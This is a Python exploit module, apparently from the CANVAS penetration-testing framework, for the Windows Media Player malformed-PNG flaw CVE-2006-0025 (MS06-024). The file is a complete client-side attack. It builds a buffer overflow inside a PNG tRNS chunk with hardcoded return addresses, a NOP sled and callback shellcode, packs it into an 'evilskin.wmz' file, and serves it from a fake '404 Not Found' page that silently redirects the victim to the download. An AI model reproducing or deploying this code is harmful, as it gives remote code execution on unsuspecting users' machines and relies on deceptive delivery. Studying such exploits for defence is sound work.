#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2006-2009
#http://www.immunityinc.com/CANVAS/ for more information

import sys,os
if '.' not in sys.path: sys.path.append('.')

# CANVAS modules
from exploitutils import *
from tcpexploit import *
from socket import * # uh?
from MOSDEF.mosdefutils import *

from httpclientside import httpclientside

NAME='Microsoft Windows Media Player Malformed PNG Vulnerability'
DESCRIPTION='Microsoft Windows Media Player Malformed PNG Vulnerability'
VERSION='1.0'

DOCUMENTATION={}
DOCUMENTATION['VENDOR']='Microsoft'
DOCUMENTATION['CVE Name']='CVE-2006-0025'
DOCUMENTATION['CVE Url']='http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-0025'
DOCUMENTATION['CVSS'] = 7.5
DOCUMENTATION['CVS URL']='http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-0025'
DOCUMENTATION['Date public']='6/13/2006'
DOCUMENTATION['MSRC']='http://www.microsoft.com/technet/security/bulletin/ms06-024.mspx '
DOCUMENTATION['Repeatability']='One shot'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Clientside'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2000','XP','2003']
PROPERTY['MSADV']='MS06-024'
PROPERTY['DELIVERY']='HTTP'

targets={
    0:['Windows XP SP0 English (WMP 9.0)',0x5961e446], #jmp esp @ wmp
    1:['Windows XP SP0-SP1 English (WMP 9.0)',0x59301DCE],
}

from canvasengine import WIN32MOSDEF

class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)
        #self.searchMethod=self.SearchBrowserType
        self.searchMethod=self.FindBrowser_FindAnyTag_CmpExtraInfo
        self.UserAgent=[('Mozilla/','MSIE','')]
        # localhost and localport used in shellcode
        self.host="127.0.0.1"
        self.port=80
        self.targets=targets
        self.covertness=0
        self.version=0
        self.badstring=''
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name=NAME
        self.filename='test.html'
        self.downloadfilename='evilskin.wmz'
        return

    def neededListenerTypes(self):
        return [WIN32MOSDEF]

    def createShellcodexPacket1(self):
        badstring=""
        self.log('creating Win32 shellcode (callback: %s:%d)' % (self.callback.ip, self.callback.port))
        self.createWin32Shellcode(badstring, self.callback.ip, self.callback.port)
        return self.shellcode

    def createxPacket1(self):
        buf='' 
        buf+='B'*6544
        buf+='B'*100
        buf+='D'*100
        buf+='E'*48
        self.info,self.eip=targets[self.version]
        buf+=intel_order(self.eip)
        buf+='\x90'*90
        buf+=self.createShellcodexPacket1()
        return buf

    def test(self):
        pass

    def run(self):
        self.host=self.target.interface
        self.filename=self.argsDict.get('filename',self.filename)
        if self.ISucceeded():
            self.setInfo('%s attacking %s:%d (succeeded!)' % (self.name, self.host, self.port))
            return 1
        self.setInfo('%s attacking %s:%d (failed!)' % (self.name, self.host, self.port))
        return 0

    def makePNGfile(self):
        """ build the malicious png """
        png=''
        #ihdr
        png+='\x89\x50\x4e\x47\x0d\x0a\x1a\x0a\x00\x00\x00\x0d\x49\x48\x44\x52\
\x00\x00\x00\x0f\x00\x00\x00\x0f\x08\x02\x00\x00\x00\xb4\xb4\x02\x1d\x00\x00\x50\xd0'                                     
        #trns (overflow here)
        png+='\x74\x52\x4e\x53'
        png+=self.createxPacket1()
        png+='\x69\x18\x9d\xec\x00\x00\x00\x01'
        #srgb
        png+='\x73\x52\x47\x42\x00\xae\xce\x1c\xe9\x00\x00\x00\x04\
\x67\x41\x4d\x41\x00\x00\xb1\x8f\x0b\xfc\x61\x05\x00\x00\x00\x20\x63\
\x48\x52\x4d\x00\x00\x7a\x26\x00\x00\x80\x84\x00\x00\xfa\x00\x00\x00\
\x80\xe8\x00\x00\x75\x30\x00\x00\xea\x60\x00\x00\x3a\x98\x00\x00\x17\
\x70\x9c\xba\x51\x3c\x00\x00\x00'
        #bidat
        png+='\x42\x49\x44\x41\x54\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\
\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\
\x30\x30\\x30\30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\
\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x29\x6a\x4f\xdb\x00\x00\x00\x00'
        #iend
        png+='\x49\x45\x4e\x44\xae\x42\x60\x82'
        return png

    def makedownloadfile(self):
        """Makes the trojan code file"""
        png=self.makePNGfile()
        pngfile=open('Resources/ms06_024/evil.png','wb')
        pngfile.write(png)
        pngfile.close()
        import zipfile
        evilskin=zipfile.ZipFile('Resources/ms06_024/'+self.filename,'w')
        self.log('Opening Resources/ms06_024/%s for output'%self.filename)
        import glob
        for name in glob.glob('Resources/ms06_024/*'):
            evilskin.write(name, os.path.basename(name), zipfile.ZIP_DEFLATED)
        evilskin.close()
        self.log('Wrote to Resources/ms06_024/%s'%self.filename)
        f=open('Resources/ms06_024/'+self.filename,'rb')
        zipdata=f.read()
        return zipdata

    def makefile(self):
        html="""<html>
<head>
<title>404 Not Found</title>
</head>
<body>
<meta http-equiv="refresh" content="0;url=DOWNLOADFILENAME">
<h1>Not Found</h1>
The requested URL /test.html was not found on this server.<p>
<hr>
</body>
</html>"""
        html=html.replace('DOWNLOADFILENAME',self.downloadfilename)
        return html

    def makesploit(self,clientheader,clientbody):
        """
        Construct the attack
        """
        from libs.spkproxy import header, body
        h=header('SERVER')
        b=body()
        user_agent=clientheader.getStrValue(['User-Agent'])
        self.log('User agent of connecting host: %s'%user_agent)
        if clientheader.URL.count(self.filename):
            #the exploit
            self.log('Sending the MS06-24 attack html file')
            sploitstring=self.makefile()
            b.setBody(sploitstring)
            h.addHeader('Content-Type','text/html')
        elif clientheader.URL.count(self.downloadfilename):
            self.log('Sending the evil skin file')
            sploitstring=self.makedownloadfile()
            self.log('Sending %d bytes'%len(sploitstring))
            h.addHeader('Content-type','binary/octet-stream')
            h.addHeader('Connection','close')
            b.setBody(sploitstring)
        else:
            #redirect to self
            self.log('redirecting to self')
            h.status='302'
            h.addHeader('Location',self.filename)
            h.addHeader('Content-Type','text/html')
        return h,b

if __name__=='__main__':
    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
